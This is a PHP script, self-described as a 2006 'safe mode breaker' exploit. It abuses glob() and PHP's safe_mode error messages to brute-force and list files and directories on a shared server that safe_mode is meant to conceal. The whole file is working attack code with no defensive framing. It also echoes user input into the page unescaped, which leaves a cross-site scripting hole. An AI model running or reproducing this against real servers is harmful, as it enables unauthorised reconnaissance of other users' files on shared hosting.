<? 

  // Safe mode breaker. eXpl0id by KPbIC [myiworm@mail.ru] 
  // data: 28.01.2006 

  error_reporting(E_WARNING); 
  ini_set("display_errors", 1); 

  echo "<head><title>".getcwd()."</title></head>"; 

  echo "<form method=POST>"; 
  echo "<div style='float: left'>Root directory: <input type=text name=root value='{$_POST['root']}'></div>"; 
  echo "<input type=submit value='--&raquo;'></form>"; 

  echo "<HR>"; 

  // break fucking safe-mode ! 

  $root = "/"; 

  if($_POST['root']) $root = $_POST['root']; 

  if (!ini_get('safe_mode')) die("Safe-mode is OFF."); 

  $c = 0; $D = array(); 
  set_error_handler("eh"); 

  $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; 

  for($i=0; $i < strlen($chars); $i++){ 
  $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}"; 

  $prevD = $D[count($D)-1]; 
  glob($path."*"); 

        if($D[count($D)-1] != $prevD){ 

        for($j=0; $j < strlen($chars); $j++){ 

           $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}"; 

           $prevD2 = $D[count($D)-1]; 
           glob($path."*"); 

              if($D[count($D)-1] != $prevD2){ 


                 for($p=0; $p < strlen($chars); $p++){ 

                 $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}"; 

                 $prevD3 = $D[count($D)-1]; 
                 glob($path."*"); 

                    if($D[count($D)-1] != $prevD3){ 


                       for($r=0; $r < strlen($chars); $r++){ 

                       $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}"; 
                       glob($path."*"); 

                       } 

                    }        

                 } 

              }        
   
        }    

        } 

  } 

  $D = array_unique($D); 

  echo "<xmp>"; 
  foreach($D as $item) echo "{$item}\n"; 
  echo "</xmp>"; 




  function eh($errno, $errstr, $errfile, $errline){ 

     global $D, $c, $i; 
     preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o); 
     if($o){ $D[$c] = $o[2]; $c++;} 

  } 

?>